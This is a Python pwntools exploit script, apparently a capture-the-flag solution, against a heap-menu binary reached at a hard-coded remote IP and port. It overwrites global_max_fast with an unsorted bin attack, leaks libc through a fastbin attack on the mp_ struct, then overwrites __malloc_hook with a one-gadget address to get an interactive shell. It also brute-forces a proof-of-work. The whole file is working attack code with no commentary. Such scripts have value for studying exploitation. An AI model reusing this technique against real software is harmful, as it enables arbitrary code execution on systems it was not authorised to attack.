#!/usr/bin/python
from pwn import *
from base64 import b64encode, b64decode
from itertools import product

p = remote("185.168.131.133",6000)
#p = process("./chall1",env={"LD_PRELOAD":"./libc-2.24.so"})
#raw_input()

def menu():
	p.recvuntil("3. Free",timeout=8)

def create(size,idx):
	menu()
	p.sendline("1")
	p.recvuntil(":")
	p.sendline(str(size))
	p.recvuntil(":",timeout=8)
	p.sendline(str(idx))

def free(idx):
	menu()
	p.sendline("3")
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx,data):
	menu()
	p.sendline("2")
	p.recvuntil(":")
	p.sendline(str(idx))
	sleep(0.1)
	p.send(data)

def hack(n,size,libc):
	target = libc + 0x397acc
	free(n)
	buf = p64(target)
	edit(n,buf)

	create(size,8)
	#raw_input()
	create(size,8)

	magic = libc + 0xd694f
	#magic = libc + 0x3f35a

	finale = "X"*20
	finale += p64(magic)
	edit(8,finale)

	create(size,8)

	p.interactive()

def pow_solve():
	postfix, sha = re.findall("SHA256\(XXXX \+ (.+)\) == (.+)", p.recvline()[:-1])[0]

	print postfix
	print sha
	sha = sha.replace('\r','')
	l = product(string.ascii_letters + string.digits, repeat=4)
	for XXXX in l:
	    XXXX = "".join(XXXX)
	    if sha256sumhex(XXXX + postfix) == sha:
	        log.success("pow = " + XXXX)
	        break
	p.sendlineafter("Give me XXXX:", XXXX)

#pow_solve()
name = "A"*32
p.recvuntil(":")
p.sendline(name)

create(222,0)		# 0
create(0x1f0,1)		# 1
create(0x1f0,2)		# 2
create(0x7fc0,3)	# 3
create(0x7fb0,9)	# 3
create(0x7fa0,10)	# 3
create(0x7f90,11)	# 3
create(0x7f80,12)	# 3
create(0x7f70,13)	# 3
create(0x7f60,14)	# 3
create(0x7f50,15)	# 3
create(0x7f40,16)	# 3
create(0x7f30,17)	# 3
create(0x7f20,18)	# 3
free(0)

global_max = 0x7ffff7dd57cc
mp_target = 0x7ffff7dd3169
lol = "A"*8
# global_max_fast.
lol += "\xc0\x57";

edit(0,lol)
create(222,4)		# 4

'''
Unsorted bin attack on global_max_fast
0x200 fastbin attack on mp_ . As soon as address allocated, we get libc leak.
0x7fff fastbin attack on __malloc_hook.
'''

free(1)
# mp_ struct.
lol = "\x69\x31"
edit(1,lol)

create(0x1f0,5)		# 5
create(0x1f0,0)		# 6

#buf = "X"*16
#edit(6,buf)

menu()
p.sendline("4")
p.recvuntil("Name:")
p.recv(33)
libc = p.recv(6).ljust(8,"\x00")
libc = u64(libc) - 0x397179
log.success("Libc: " + hex(libc))
raw_input()

target = libc + 0x397acc

mask = (target & 0xffff00000000)/0x100000000
print hex(mask)
#raw_input()
idx_f = 3
if(mask >= 0x7f30 and mask < 0x7f40):
	hack(18,0x7f20,libc)
if(mask >= 0x7f40 and mask < 0x7f50):
	hack(17,0x7f30,libc)
if(mask >= 0x7f50 and mask < 0x7f60):
	hack(16,0x7f40,libc)
if(mask >= 0x7f60 and mask < 0x7f70):
	hack(15,0x7f50,libc)
if(mask >= 0x7f70 and mask < 0x7f80):
	hack(14,0x7f60,libc)
if(mask >= 0x7f80 and mask < 0x7f90):
	hack(13,0x7f70,libc)
if(mask >= 0x7f90 and mask < 0x7fa0):
	hack(12,0x7f80,libc)
if(mask >= 0x7fa0 and mask < 0x7fb0):
	hack(11,0x7f90,libc)
if(mask >= 0x7fb0 and mask < 0x7fc0):
	hack(10,0x7fa0,libc)
if(mask >= 0x7fc0 and mask < 0x7fd0):
	hack(9,0x7fb0,libc)
if(mask >= 0x7fd0 and mask < 0x7fe0):
	hack(3,0x7fc0,libc)
else:
	log.failure("Error mask not found")
	p.close()
